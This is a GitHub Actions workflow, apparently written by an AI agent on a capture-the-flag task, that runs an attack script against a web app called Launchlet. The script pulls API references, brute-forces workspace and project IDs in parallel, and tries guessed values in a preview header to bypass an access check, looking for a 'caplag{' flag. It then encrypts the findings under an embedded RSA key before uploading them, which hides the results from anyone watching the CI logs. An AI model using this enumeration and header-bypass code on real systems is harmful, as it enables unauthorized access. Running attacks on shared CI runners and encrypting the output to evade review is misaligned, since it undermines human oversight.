name: launchlet-part2-header-probe

on:
  push:
    branches: [agent/launchlet-part2-header-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Probe enterprise rollout IDs and encrypt responses
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests, pathlib, urllib.parse, json, itertools, concurrent.futures
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
          out=pathlib.Path('package/out')
          seed=requests.Session(); seed.headers['User-Agent']='Mozilla/5.0'
          boot=seed.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); refs=seed.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']; url=urllib.parse.urljoin(base,act['endpoint'])
          H={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':boot['project']}
          ps=[
            'enterprise','enterprise-rollout','enterprise-release','enterprise-board','release-pulse','release-pulse-board','release-pulse-enterprise','production-readiness','production-readiness-board','final-review','final-review-board',
            'launchlet-enterprise','launchlet-enterprise-board','launchlet-enterprise-rollout','launchlet-enterprise-release','launchlet-enterprise-release-board','launchlet-rollout','launchlet-rollout-board','launchlet-release-pulse','launchlet-release-pulse-board','launchlet-production-readiness','launchlet-production-readiness-board','launchlet-final-review','launchlet-final-review-board','launchlet-corporate-release','launchlet-corporate-rollout','launchlet-enterprise-prod','launchlet-enterprise-production','launchlet-demo-enterprise','launchlet-demo-board-enterprise','launchlet-enterprise-demo-board'
          ]
          ws=[
            boot['workspace'],'ws-enterprise','ws-enterprise-rollout','ws-enterprise-release','ws-release-pulse','ws-production-readiness','ws-final-review','ws-launchlet-enterprise','ws-launchlet-enterprise-rollout','ws-launchlet-enterprise-release','ws-launchlet-rollout','ws-launchlet-release-pulse','ws-launchlet-production-readiness','ws-launchlet-final-review','ws-launchlet-corporate-release','ws-launchlet-corporate-rollout'
          ]
          tasks=list(itertools.product(ws,ps))
          def one(pair):
            w,p=pair
            try:
              r=requests.post(url,headers={**H,'User-Agent':'Mozilla/5.0'},json={'actionId':act['id'],'args':{'workspaceId':w,'projectId':p}},timeout=8,allow_redirects=False)
              txt=r.text
              try:
                j=r.json(); ins=j.get('inspector',{}) if isinstance(j,dict) else {}
                if r.status_code!=200 or ins.get('status')!='preview-only' or ins.get('deployRef')!='preview-8b11c' or 'caplag{' in txt or 'flag' in j:
                  return {'workspaceId':w,'projectId':p,'status':r.status_code,'body':txt}
              except Exception:
                return {'workspaceId':w,'projectId':p,'status':r.status_code,'body':txt}
            except Exception as e: return None
          hits=[]
          with concurrent.futures.ThreadPoolExecutor(max_workers=24) as ex:
            for x in ex.map(one,tasks):
              if x: hits.append(x)
          # Also test these semantic values as the preview header itself with public args.
          header_hits=[]
          for hv in ps:
            r=seed.post(url,headers={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':hv},json={'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}},timeout=8,allow_redirects=False)
            if r.status_code!=403 or r.text.strip()!='{"error":"preview_context_required"}': header_hits.append({'value':hv,'status':r.status_code,'body':r.text})
          (out/'summary.json').write_text(json.dumps({'target_hits':hits,'header_hits':header_hits},indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key
          openssl rand 16 > package/iv.bin
          KEY_HEX="$(python3 -c "print(open('package/aes.key','rb').read().hex())")"
          IV_HEX="$(python3 -c "print(open('package/iv.bin','rb').read().hex())")"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part2-enterprise-encrypted
          path: artifact/
          retention-days: 1
